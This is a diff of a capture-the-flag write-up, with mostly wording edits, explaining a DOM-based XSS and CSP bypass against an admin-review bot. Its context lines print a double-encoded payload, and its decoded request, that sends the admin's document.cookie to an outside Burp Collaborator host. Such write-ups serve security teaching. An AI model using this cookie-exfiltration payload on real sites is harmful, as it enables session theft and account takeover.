@@ -11,13 +11,13 @@ DOM-based XSS. Finally a use-case for double encoding.
 
 ## Solution
 
-In this challenge we are given the source code. As we can see from the source, we need to reach `/join` to get the flag, but that is only possible if we have the correct admin `auth` cookie. So, we somehow have to leak it. The app also has Content-Security-Policy (CSP) enabled, which is set to `"default-src 'self';script-src 'self' 'unsafe-eval'"`. So, it seems that somehow invoking an `eval` with attack-controlled data should be our way to go here.
+In this challenge we are given the source code. As we can see from the source, we need to reach `/join` to get the flag, but that is only possible if we have the correct admin `auth` cookie. So, we somehow have to leak it. The app also has Content-Security-Policy (CSP) enabled, which is set to `"default-src 'self';script-src 'self' 'unsafe-eval'"`. So, it seems that somehow invoking an `eval` with attacker-controlled data should be our way to go here.
 
-There seems to be an admin bot. The user submits essays at the `/register` endpoint via POST requests and with the parameters `email` and `essay`. Then, the bot will visit the URL `/review/essay?email={email}&essay={essay}` which is only accessible from `127.0.0.1`.
+There seems to be an admin bot. The user submits essays at the `/register` endpoint via POST requests, with the parameters `email` and `essay`. Then, the bot will visit the URL `/review/essay?email={email}&essay={essay}` which is only accessible from `127.0.0.1`.
 
 A first attempt to bypass the IP restriction was by using the `x-forwarded-for` and similar headers, but this didn't work.
 
-The next thing to note is how the user-controlled parameters are handled. The `/review/essay` will get its contents by populating `essay_checker.html` and in this template file we notice the expression `{{essay.essay|safe}}`. This means that this parameter will not be escaped and is assumed to be already safe. So, the `essay` variable allows us for an XSS attack.
+The next thing to note is how the user-controlled parameters are handled. The `/review/essay` will get its contents by populating `essay_checker.html` and in this template file we notice the expression `{{essay.essay|safe}}`. This means that this parameter will not be escaped and is assumed to be already safe. So, the `essay` variable allows us for an XSS attack:
 
 ```
 POST /register
@@ -67,7 +67,7 @@ POST /register
 email=asd%40foo.com&essay=<p%2bid%253d"debug"%2b%2bdata-iloveumass%253d"')%253b%2bwindow.location%2b%253d%2b'http%253a//nb20aa7dkwzrirpv5qa71lnleck28r.burpcollaborator.net/cookie%253d'%252bencodeURIComponent(btoa(document.cookie))%253b%2b//"></p>%2b<script%2bsrc%253d/static/js/thing.js></script>
 ```
 
-Notice the double encoding of all the characters. The first encoding is for the current request that we are making. Then, when the bot will make the request, it will decode the characters once. So the bot will do:
+Notice the double encoding of all the characters. The first encoding is for the current request that we are making. Then, when the bot will make the request, it will decode the characters once more. So, after the first decoding, the bot will do the following request:
 
 ```
 GET /review/essay?email=asd@foo.com&essay=<p+id%3d"debug"++data-iloveumass%3d"')%3b+window.location+%3d+'http%3a//nb20aa7dkwzrirpv5qa71lnleck28r.burpcollaborator.net/cookie%3d'%2bencodeURIComponent(btoa(document.cookie))%3b+//"></p>+<script+src%3d/static/js/thing.js></script>
